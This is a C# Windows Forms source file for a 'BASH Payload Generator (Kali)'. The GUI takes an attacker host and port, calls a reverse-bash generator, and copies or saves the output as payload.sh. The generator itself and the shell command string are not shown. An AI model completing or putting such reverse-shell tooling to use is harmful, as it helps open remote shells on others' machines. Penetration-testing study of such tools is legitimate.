using System;
using System.Windows.Forms;
using System.IO;

namespace BashPayloadGenerator
{
    public class MainForm : Form
    {
        private TextBox ipBox;
        private TextBox portBox;
        private TextBox payloadBox;
        private Button generateBtn;
        private Button copyBtn;
        private Button saveBtn;

        public MainForm()
        {
            this.Text = "BASH Payload Generator (Kali)";
            this.Size = new System.Drawing.Size(600, 400);
            this.StartPosition = FormStartPosition.CenterScreen;

            var ipLabel = new Label { Text = "LHOST:", Location = new System.Drawing.Point(20, 20), AutoSize = true };
            ipBox = new TextBox { Location = new System.Drawing.Point(100, 20), Width = 150 };

            var portLabel = new Label { Text = "LPORT:", Location = new System.Drawing.Point(20, 60), AutoSize = true };
            portBox = new TextBox { Location = new System.Drawing.Point(100, 60), Width = 100 };

            generateBtn = new Button { Text = "Generate Payload", Location = new System.Drawing.Point(20, 100) };
            generateBtn.Click += OnGenerateClick;

            payloadBox = new TextBox
            {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Location = new System.Drawing.Point(20, 140),
                Width = 540,
                Height = 150,
                ReadOnly = true
            };

            copyBtn = new Button { Text = "Copy", Location = new System.Drawing.Point(200, 100) };
            copyBtn.Click += (_, __) => Clipboard.SetText(payloadBox.Text);

            saveBtn = new Button { Text = "Save to file", Location = new System.Drawing.Point(300, 100) };
            saveBtn.Click += OnSaveClick;

            Controls.AddRange(new Control[] { ipLabel, ipBox, portLabel, portBox, generateBtn, copyBtn, saveBtn, payloadBox });
        }

        private void OnGenerateClick(object sender, EventArgs e)
        {
            string ip = ipBox.Text.Trim();
            string port = portBox.Text.Trim();

            if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(port))
            {
                MessageBox.Show("Please fill both LHOST and LPORT.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            payloadBox.Text = PayloadGenerator.GenerateReverseBash(ip, port);
        }

        private void OnSaveClick(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(payloadBox.Text))
            {
                MessageBox.Show("No payload to save.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SaveFileDialog saveDialog = new SaveFileDialog
            {
                Filter = "Bash script (*.sh)|*.sh|All files (*.*)|*.*",
                FileName = "payload.sh"
            };

            if (saveDialog.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveDialog.FileName, payloadBox.Text);
                MessageBox.Show($"Payload saved to:\n{saveDialog.FileName}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
